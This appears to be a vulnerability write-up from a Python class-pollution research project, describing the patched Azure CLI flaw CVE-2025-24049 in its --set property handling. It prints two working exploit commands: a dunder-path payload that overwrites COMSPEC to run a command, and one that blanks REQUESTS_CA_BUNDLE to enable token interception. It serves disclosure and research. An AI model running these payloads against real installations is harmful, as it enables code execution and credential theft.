---
title: "Azure CLI"
weight: 2
---

# Azure CLI (CVE-2025-24049)

**Azure Command-Line Interface (CLI)** is Microsoft's official tool for managing Azure resources (4.1K stars, 91.6K weekly downloads).

| Field | Value |
|-------|-------|
| Repository | [Azure/azure-cli](https://github.com/Azure/azure-cli) |
| Version | v2.68.0 |
| CVE | [CVE-2025-24049](https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2025-24049) |
| Type | Agnostic-Get × Dual-Set |
| Input | Local (--set argument) |
| Status | Fixed |

## Vulnerability

Azure CLI processes the `--set` argument through `set_properties`, which splits the expression into key-value pairs and resolves the target object through `_find_property`:

```python
def set_properties(instance, expression, force_string):
    key, value = _split_key_value_pair(expression)
    name, path = _get_name_path(key)
    instance = _find_property(instance, path)
    
    if isinstance(instance, dict):
        instance[name] = value              # Item-Set
    else:
        setattr(instance, make_snake_case(name), value)  # Attr-Set

def _find_property(instance, path):
    for part in path:
        if isinstance(instance, dict):
            instance = instance[part]       # Item-Get
        elif hasattr(instance, make_snake_case(part)):
            instance = getattr(instance, make_snake_case(part))  # Attr-Get
    return instance
```

## Detection Challenge

The `make_snake_case` function (lines 20-27) acts as a **barrier**: it converts keys to lowercase with underscores, preventing direct traversal of dunder names like `__class__`.

However, Pyrl identifies that a **second-order attribute get** operation — `obj.__dict__[name]` — is still accessible because `__dict__` does not match the regex pattern. The `getattr` on line 18 retrieves the dictionary representation, and the get-item on line 16 can access arbitrary keys within it.

## Exploitation: Token Leakage & OS Command Injection

### OS Command Injection (Windows)

**Exploit command**:
```bash
az resource update --ids "X" --set \
  "__class__.__init__.__globals__.sys.modules.os.environ.COMSPEC=cmd /c calc *"
```

**Key Path**: `__class__.__init__.__globals__.sys.modules.os.environ.COMSPEC`

**Effect**: On Windows, Azure CLI uses `COMSPEC` to spawn subprocesses. Overwriting it with a malicious command causes arbitrary code execution when Azure CLI subsequently spawns a subprocess.

### Token Leakage

**Exploit command**:
```bash
az resource update --ids "X" --set \
  "__class__.__init__.__globals__.sys.modules.os.environ.REQUESTS_CA_BUNDLE=/dev/null"
```

**Effect**: Disabling SSL verification allows the attacker to intercept Azure authentication tokens via man-in-the-middle attack.

## Why This Matters

- Azure CLI is installed on millions of developer machines and CI/CD pipelines
- The `--set` argument is commonly used in automation scripts
- An attacker who can influence the `--set` value (e.g., via a malicious config file, CI pipeline parameter, or LLM agent prompt injection) achieves command execution
- Microsoft acknowledged and patched the vulnerability, assigning CVE-2025-24049

## Proof of Concept

See [`cp-collection/azure-cli/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/azure-cli/poc) for the full exploit.
